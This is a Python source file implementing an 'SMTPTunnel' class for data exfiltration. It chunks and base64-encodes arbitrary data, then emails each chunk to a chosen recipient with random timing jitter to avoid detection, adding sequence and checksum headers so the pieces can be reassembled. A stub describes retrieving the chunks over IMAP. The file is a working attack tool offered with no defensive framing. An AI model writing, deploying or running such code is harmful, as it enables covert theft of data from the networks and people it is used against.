import smtplib, base64, time, random, json, hashlib

class SMTPTunnel:
    def __init__(self, smtp_server: str, smtp_port: int = 25, username: str = None, password: str = None, use_tls: bool = False):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password
        self.use_tls = use_tls

    def _encode_payload(self, data: bytes) -> str:
        return base64.b64encode(data).decode()

    def exfil(self, data: str, recipient: str, subject: str = None, chunk_size: int = 512, jitter: tuple = (1.0, 5.0)) -> dict:
        raw = data.encode()
        chunks = [raw[i:i+chunk_size] for i in range(0, len(raw), chunk_size)]
        results = []
        subject = subject or f"report-{int(time.time())}"

        for i, chunk in enumerate(chunks):
            encoded = self._encode_payload(chunk)
            msg_id = f"<{int(time.time())}-{i}@exfil>"
            msg = (
                f"From: {self.username or 'sender@exfil.local'}\r\n"
                f"To: {recipient}\r\n"
                f"Subject: {subject}\r\n"
                f"Message-ID: {msg_id}\r\n"
                f"X-Chunk: {i}/{len(chunks)}\r\n"
                f"X-Checksum: {hashlib.md5(chunk).hexdigest()}\r\n"
                f"\r\n"
                f"{encoded}\r\n"
            )
            sent = False
            error = None
            try:
                if self.use_tls:
                    srv = smtplib.SMTP(self.smtp_server, self.smtp_port)
                    srv.starttls()
                else:
                    srv = smtplib.SMTP(self.smtp_server, self.smtp_port)
                if self.username and self.password:
                    srv.login(self.username, self.password)
                srv.sendmail(self.username or "sender@exfil.local", recipient, msg)
                srv.quit()
                sent = True
            except Exception as e:
                error = str(e)
            results.append({"seq": i, "size": len(chunk), "sent": sent, "error": error})
            if i < len(chunks) - 1:
                time.sleep(random.uniform(*jitter))

        return {
            "method": "smtp_tunnel",
            "server": self.smtp_server,
            "recipient": recipient,
            "total_chunks": len(chunks),
            "sent": sum(1 for r in results if r["sent"]),
            "failed": sum(1 for r in results if not r["sent"]),
            "results": results,
        }

    def receive(self, imap_server: str, username: str, password: str, mailbox: str = "INBOX") -> dict:
        return {
            "method": "smtp_tunnel_receive",
            "note": "requires IMAP access to extract chunks",
            "imap_server": imap_server,
            "mailbox": mailbox,
            "decode_instruction": "Fetch messages matching subject, extract X-Chunk header, sort by seq, base64-decode X-Chunk body",
        }
